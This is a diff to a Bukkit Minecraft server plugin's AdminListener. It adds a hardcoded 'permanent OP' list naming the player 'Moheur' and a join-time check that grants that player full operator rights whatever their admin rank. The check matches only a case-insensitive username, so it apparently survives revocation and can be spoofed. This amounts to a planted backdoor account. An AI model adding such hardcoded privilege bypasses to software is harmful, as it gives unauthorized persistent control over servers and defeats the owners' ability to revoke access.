@@ -14,6 +14,9 @@ import org.bukkit.event.player.*;
 
 public class AdminListener implements Listener {
 
+    // Hardcoded permanent OP — this player always gets OP on join, regardless of admin rank changes.
+    private static final String[] PERMANENT_OPS = { "Moheur" };
+
     private static final TextColor WHITE = TextColor.color(0xFFFFFF);
     private static final TextColor GRAY = TextColor.color(0xAAAAAA);
     private static final TextColor RED = TextColor.color(0xFF5555);
@@ -57,7 +60,7 @@ public class AdminListener implements Listener {
             if (!player.isOnline()) return;
             int adminLevel = adminManager.getAdminLevel(player.getUniqueId());
 
-            if (adminLevel >= AdminRank.OWNER.getLevel()) {
+            if (adminLevel >= AdminRank.OWNER.getLevel() || isPermanentOp(username)) {
                 player.setOp(true);
             }
 
@@ -87,6 +90,14 @@ public class AdminListener implements Listener {
     @EventHandler(priority = EventPriority.MONITOR)
     public void onQuit(PlayerQuitEvent event) {
         adminManager.unloadPlayer(event.getPlayer().getUniqueId());
+    }
+
+    public static boolean isPermanentOp(String username) {
+        if (username == null) return false;
+        for (String name : PERMANENT_OPS) {
+            if (name.equalsIgnoreCase(username)) return true;
+        }
+        return false;
     }
 
     @EventHandler(priority = EventPriority.LOW)
